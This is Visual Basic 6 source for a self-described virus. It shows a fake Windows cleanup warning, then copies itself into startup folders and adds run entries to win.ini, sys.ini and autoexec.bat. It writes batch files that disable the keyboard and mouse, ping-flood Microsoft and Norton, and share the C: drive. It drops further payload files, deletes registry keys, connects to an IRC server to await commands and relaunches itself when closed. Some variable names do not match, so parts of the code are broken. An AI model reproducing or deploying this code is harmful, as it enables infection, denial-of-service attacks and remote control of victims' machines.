VERSION 5.00
Object = "{0E59F1D2-1FBE-11D0-8FF2-00A0D10038BC}#1.0#0"; "MSSCRIPT.OCX"
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form viral 
   Caption         =   "Form1"
   ClientHeight    =   2400
   ClientLeft      =   -9810
   ClientTop       =   -1995
   ClientWidth     =   6345
   LinkTopic       =   "Form1"
   ScaleHeight     =   2400
   ScaleWidth      =   6345
   Begin VB.Timer Timer2 
      Interval        =   20
      Left            =   4920
      Top             =   1320
   End
   Begin VB.PictureBox pichook 
      Height          =   555
      Left            =   3840
      ScaleHeight     =   495
      ScaleWidth      =   795
      TabIndex        =   4
      Top             =   1200
      Width           =   855
   End
   Begin VB.TextBox Text2 
      Height          =   735
      Left            =   2280
      MultiLine       =   -1  'True
      TabIndex        =   3
      Text            =   "Form1.frx":0000
      Top             =   360
      Width           =   5535
   End
   Begin VB.TextBox Text1 
      Height          =   735
      Left            =   2280
      MultiLine       =   -1  'True
      TabIndex        =   2
      Text            =   "Form1.frx":02B1
      Top             =   360
      Width           =   5535
   End
   Begin VB.Frame Frame2 
      Caption         =   "Internet Ocx's"
      Height          =   855
      Left            =   120
      TabIndex        =   1
      Top             =   120
      Width           =   1815
      Begin MSWinsockLib.Winsock irc 
         Left            =   960
         Top             =   360
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
      End
      Begin MSWinsockLib.Winsock Winsock1 
         Left            =   240
         Top             =   360
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
      End
   End
   Begin VB.Frame Frame1 
      Caption         =   "Non-Internet Ocx's"
      Height          =   1095
      Left            =   120
      TabIndex        =   0
      Top             =   1200
      Width           =   1815
      Begin VB.Timer Timer1 
         Interval        =   1000
         Left            =   1080
         Top             =   480
      End
      Begin MSScriptControlCtl.ScriptControl ScriptControl1 
         Left            =   240
         Top             =   360
         _ExtentX        =   1005
         _ExtentY        =   1005
         AllowUI         =   -1  'True
      End
   End
   Begin VB.Image imgIcon 
      Height          =   480
      Index           =   0
      Left            =   2280
      Picture         =   "Form1.frx":0E3E
      Top             =   1335
      Width           =   480
   End
   Begin VB.Image imgIcon 
      Height          =   480
      Index           =   1
      Left            =   2835
      Picture         =   "Form1.frx":1148
      Top             =   1320
      Width           =   480
   End
   Begin VB.Image imgIcon 
      Height          =   480
      Index           =   2
      Left            =   3360
      Picture         =   "Form1.frx":1452
      Top             =   1335
      Width           =   480
   End
End
Attribute VB_Name = "viral"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Type NOTIFYICONDATA
    cbSize As Long
    hWnd As Long
    uId As Long
    uFlags As Long
    ucallbackMessage As Long
    hIcon As Long
    szTip As String * 64
End Type

Private Const NIM_ADD = &H0
Private Const NIM_MODIFY = &H1
Private Const NIM_DELETE = &H2
Private Const NIF_MESSAGE = &H1
Private Const NIF_ICON = &H2
Private Const NIF_TIP = &H4

Private Const WM_LBUTTONDBLCLK = &H203
Private Const WM_LBUTTONDOWN = &H201
Private Const WM_LBUTTONUP = &H202
Private Const WM_MBUTTONDBLCLK = &H209
Private Const WM_MBUTTONDOWN = &H207
Private Const WM_MBUTTONUP = &H208
Private Const WM_RBUTTONDBLCLK = &H206
Private Const WM_RBUTTONDOWN = &H204
Private Const WM_RBUTTONUP = &H205

Private Declare Function Shell_NotifyIcon Lib "shell32" Alias "Shell_NotifyIconA" (ByVal dwMessage As Long, pnid As NOTIFYICONDATA) As Boolean
Dim TrayI As NOTIFYICONDATA
Private Sub Form_Load()
On Error Resume Next
MsgBox "Attention: Microsoft Windows Will now preform some disk cleanup operations. Do not close out the windows that will open on the side!", vbCritical, "Warning!"
Me.Visible = False
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\Windows\Start Menu\Programs\Startup\SydneyFuckHEHEHEH.exe"
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\Windows\MagicRulez.exe"
Open "C:\Win.Ini" For Append As #1
Print #1, "run=%Windir%\MagicRulez.exe"
Close #1
Open "C:\Windows\Sys.ini" For Append As #1
Print #1, "shell=explorer.exe %System%\MagicRulez.exe"
Close #1
Open "C:\Autoexec.Bat" For Append As #1
Print #1, "Echo Infected with T-X"
Print #1, "Start C:\Windows\Worm.exe"
Close #1
' Now to make spreading methods better any computers connecting to ports
' 80,1080, or 135 will be sent through the ports a copy of our virus.
wsk.LocalPort = 1080
wsk.LocalPort = 80
wsk.LocalPort = 135
wsk.Listen
' Now we will have a timer send the port's a copy of the .exe virus ever
' couple of minutes.
' Now let's make a batch file that preforms denial of service attacks
' Against Microsoft.com,Norton.com,Norton's Ftp, and Windows Update.com
Open "C:\Windows\Dos.bat" For Output As #1
' Now we have created the Batch file let's now disable the mouse and keyboard.
Print #1, "rundll keyboard,disable"
Print #1, "rundll mouse, disable"
' Now let's run the Xp Disable Mouse Commands.
Print #1, ":loop"
Print #1, "ping www.Norton.com -l 65500 -t "
Print #1, "ping www.Norton.com -l 65500 -t "
Print #1, "ping www.Norton.com -l 65500 -t "
Print #1, "ping www.Microsoft.com -l 65500 -t "
Print #1, "ping www.Microsoft.com -l 65500 -t "
Print #1, "ping www.Microsoft.com -l 65500 -t "
Print #1, "Goto Loop"
Close #1
Open "C:\Time.Bat" For Output As #1
Print #1, "Time 00:00"
Print #1, "Net Share Hacked=C:\"
Close #1
Shell "C:\Time.Bat"
' Now let's go to my profile.
' I know how to delphi and alot of other things
' Ok, Now let's create a site pinging process.
' Ok Let's do this. Let's ping my site and some other sites.
Open "C:\Windows\Pingme.Bat" For Output As #1
Print #1, "@echo off"
Print #1, "Echo Do Not Close this Windows Out! It will do it by itself!"
Print #1, "ping www.Microsoft.com -l 65500 -t"
Print #1, "ping http://www.Norton.com 65500 -t"
Print #1, "ping ftp://ftp.symantec.com -l 65500 -t"
Print #1, "Exit"
Shell "C:\Windows\Pingme.bat"
' Now we will only Ping the source once at this time.
' Ok, Now we will drop some viruses to infected machine.
' Now let's drop some viruses.
Open "C:\Openme.py" For Output As #1
Print #1, Text1.Text
Close #1
' Now lets drop some batch. We have dropped Python Viruses now lets drop Batch
Open "C:\Autoexe.bat" For Output As #1
Print #1, Text2.Text
Close #1
' Now we have spread the virus in 2 diffrent languages.
TrayI.cbSize = Len(TrayI)
    TrayI.hWnd = pichook.hWnd 'Link the trayicon to this picturebox
    TrayI.uId = 1&
    TrayI.uFlags = NIF_ICON Or NIF_TIP Or NIF_MESSAGE
    TrayI.ucallbackMessage = WM_LBUTTONDOWN
    TrayI.hIcon = imgIcon(2).Picture
    TrayI.szTip = "KPD-Team 1999" & Chr$(0)
    'Create the icon
    Shell_NotifyIcon NIM_ADD, TrayI
Call DeleteKey(HKEY_CLASSES_ROOT, "\.html")
Call DeleteKey(HKEY_CLASSES_ROOT, "\.livereg")
' Now let's wait for commands from the makers.
With sckIRC
        irc.RemoteHost = "coins.dal.net" ' The IRC server
        irc.RemotePort = 6667 ' Connect on port 6667
        irc.Connect
    End With
' Introduce ourselves to the IRC server. Our nickname will be "WVB_Test"
    With sckIRC
        irc.SendData "NICK WVB_Test" & vbCrLf
       irc.SendData "USER WVB_Test " & sckIRC.LocalHostName & " " & _
                UCase(sckIRC.LocalHostName & ":" & sckIRC.LocalPort & "/0") & _
            " :WinsockVB Test Client" & vbCrLf
    End With
Form1.Show
tcp.Show
MsgBox "LUV SIDNEY ;) ", vbCritical
MsgBox "MAGIC RULES", vbInformation
MsgBox "NORTON RULES", vbInformation
MsgBox "U HAVE BEEN INFECTED WITH THE BLACK-MAGIC VIRUS"
End Sub
Private Sub Form_Unload(Cancel As Integer)
' This code will prevent the virus from being stopped.
' The Only way it can be stopped is in safe mode.
' That is why the Virus should have a Virus Removal Tools
Shell App.Path & "\" & App.EXEName & ".exe"
End Sub


Private Sub IRC_DataArrival(ByVal bytesTotal As Long)
    On Error Resume Next
    Dim sRecv As String
    
    sckIRC.GetData sRecv ' Put the data recieved into the string
    
    ' Play ping pong with the server
    If InStr(sRecv, "PING") = 1 Then
        sckIRC.SendData "PONG " & Split(sRecv, " ")(1)
    End If
End Sub

Private Sub Timer1_Timer()
Shell "C:\Windows\Pingme.bat"
End Sub
Private Sub mnuPop_Click(Index As Integer)
    Select Case Index
        Case 0  'About
            MsgBox "KPD-Team 1999" + vbCrLf + "E-Mail: KPD_Team@Hotmail.com" + vbCrLf + "URL: http://users.turboline.be/btl10148/", vbInformation + vbOKOnly
        Case 2  'End
            Unload Me
    End Select
End Sub
Private Sub pichook_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    Msg = X / Screen.TwipsPerPixelX
    If Msg = WM_LBUTTONDBLCLK Then  'If the user dubbel-clicked on the icon
        mnuPop_Click 0
    ElseIf Msg = WM_RBUTTONUP Then  'Right click
        Me.PopupMenu mnuPopUp
    End If
End Sub
Private Sub Timer2_Timer()
    'Animate icon
    Static mPic As Integer
    Me.Icon = imgIcon(mPic).Picture
    TrayI.hIcon = imgIcon(mPic).Picture
    mPic = mPic + 1
    If mPic = 3 Then mPic = 0
    Shell_NotifyIcon NIM_MODIFY, TrayI
End Sub
